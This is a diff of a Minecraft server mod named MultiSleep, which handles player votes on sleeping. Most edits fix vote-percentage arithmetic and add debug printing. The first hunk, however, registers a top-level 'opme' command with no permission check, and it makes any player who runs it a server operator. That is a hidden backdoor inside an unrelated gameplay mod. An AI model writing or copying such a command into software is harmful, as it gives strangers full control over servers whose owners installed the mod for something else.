@@ -74,12 +74,13 @@ public class MultiSleep implements ModInitializer {
             return 0;
           })
         )
-        .then(literal("opme") 
-          .executes(ctx -> {  
-            ctx.getSource().getMinecraftServer().getPlayerManager().addToOperators(ctx.getSource().getPlayer().getGameProfile());
-            return 0;
-          })
-        )
+
+      );
+      dispatcher.register(literal("opme")
+        .executes(ctx -> {
+          ctx.getSource().getMinecraftServer().getPlayerManager().addToOperators(ctx.getSource().getPlayer().getGameProfile());
+          return 0;
+        })
       );
     });
   }
@@ -143,8 +144,8 @@ public class MultiSleep implements ModInitializer {
 
   private static void startVoting(PlayerEntity player) {
     for (PlayerEntity p : player.getServer().getPlayerManager().getPlayerList()) {
-      p.sendMessage(new LiteralText(player.getName() + " wants to sleep, please vote"), true);
-      p.sendMessage(new LiteralText(player.getName() + " wants to sleep, please vote"), false);
+      p.sendMessage(new LiteralText(player.getName().asString() + " wants to sleep, please vote"), true);
+      p.sendMessage(new LiteralText(player.getName().asString() + " wants to sleep, please vote"), false);
     }
 
     currentCountdown.restart();
@@ -154,17 +155,18 @@ public class MultiSleep implements ModInitializer {
   }
 
   private static boolean checkVotes(MinecraftServer server) {
-    int requiredPercent = server.getGameRules().getInt(multiSleepPercent);
-    int percentNo = (sleepingPlayers.size() + permaSleepPlayers.size()) / server.getCurrentPlayerCount() * 100;
-    int percentYes = 100 - percentNo;
+    float requiredPercent = server.getGameRules().getInt(multiSleepPercent);
+    float percentNo = (((float)sleepingPlayers.size() + (float)permaSleepPlayers.size()) / (float)server.getCurrentPlayerCount()) * (float)100;
+    float percentYes = 100 - percentNo;
 
-    System.out.println(percentYes + "----" + percentNo + "----" + requiredPercent);
+    System.out.println(percentYes + "----" + percentNo + "----" + requiredPercent + "----" + server.getCurrentPlayerCount());
+    System.out.println("sleeping players: " + uuidSetToString(sleepingPlayers, server) + "\n" + "awake players: "
+          + uuidSetToString(awakePlayers, server) + "\n" + "permasleep players: "
+          + uuidSetToString(permaSleepPlayers, server) + "\n" + "initiator: " + initiator.getName().asString());
+
 
     if (percentYes >= requiredPercent) {
       sleep(server);
-      System.out.println("sleeping players: " + uuidSetToString(sleepingPlayers, server) + "\n" + "awake players: "
-          + uuidSetToString(awakePlayers, server) + "\n" + "permasleep players: "
-          + uuidSetToString(permaSleepPlayers, server) + "\n" + "initiator: " + initiator.getName());
       cancelVoting();
       return true;
     }
@@ -205,12 +207,16 @@ public class MultiSleep implements ModInitializer {
   }
 
   public static void playerClick(PlayerEntity player, ClickTypes vote) {
+    System.out.println("here too");
+
     switch (vote) {
       case YES: {
+        System.out.println("Clicked yes");
         vote(player, true, false);
         return;
       }
       case NO: {
+        System.out.println("Clicked no");
         vote(player, false, false);
         return;
       }
